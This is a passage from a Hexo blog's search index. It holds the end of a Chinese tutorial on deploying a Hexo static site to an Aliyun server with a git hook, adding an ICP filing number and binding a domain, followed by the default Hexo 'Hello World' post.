-f<br></code></pre></td></tr></table></figure><p>将此文件设置成可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x /var/repo/hexo_static.git/hooks/post-receive<br></code></pre></td></tr></table></figure><h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>修改_config.yml配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># URL</span><br><span class="hljs-comment">## If your site is put in a subdirectory, set url as &#x27;http://example.com/child&#x27; and root as &#x27;/child/&#x27;</span><br>url: http://服务器IP<br><br>deploy:<br>    <span class="hljs-built_in">type</span>: git<br>    repo: root@服务器IP:/var/repo/hexo_static<br>    branch: master<br></code></pre></td></tr></table></figure><p>将本地内容上传云服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g -d<br></code></pre></td></tr></table></figure><p>第一次会出现下图所示错误<br><img src="https://img-blog.csdnimg.cn/20210407175526299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -R 服务器IP<br></code></pre></td></tr></table></figure><p>再次执行<code>hexo g -d</code>即可成功<br><img src="https://img-blog.csdnimg.cn/20210407180432805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="备案"><a href="#备案" class="headerlink" title="备案"></a>备案</h2><p>添加备案号<br>在主题文件的layout_partial\footer.ejs中添加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"> <span class="hljs-comment">&lt;!--添加备案号--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-center&quot;</span>&gt;</span><br>         <span class="hljs-comment">&lt;!--img src=&quot;https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png&quot;--&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://beian.miit.gov.cn/&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:#f72b07&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>备案号<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><p>登录阿里云，并进入控制台，点击左侧菜单中的域名，进入域名管理，选择要解析的域名，点击解析，进入解析设置。点击添加记录<br><img src="https://img-blog.csdnimg.cn/20210422194119910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加记录两条记录值，一个是www，一个是@，记录值阿里云服务器的地址（公）</p><p><img src="https://img-blog.csdnimg.cn/20210422194302611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>注意：本文所有命令均在git<br>命令行使用</strong></p><p>参考文章：<br><a href="https://www.imooc.com/article/313424">Hexo结合Stun静态博客搭建从入门到入土</a><br><a href="https://www.jianshu.com/p/3a6342e16e57">hexo 添加live2d看板动画</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/104221186">记录本地Hexo博客部署到服务器上</a></p>]]></content>
    
    
    <categories>
      
      <category>博客优化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>搭建博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/02/02/hello-world/"/>
    <url>/2020/02/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><a id="more"></a><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
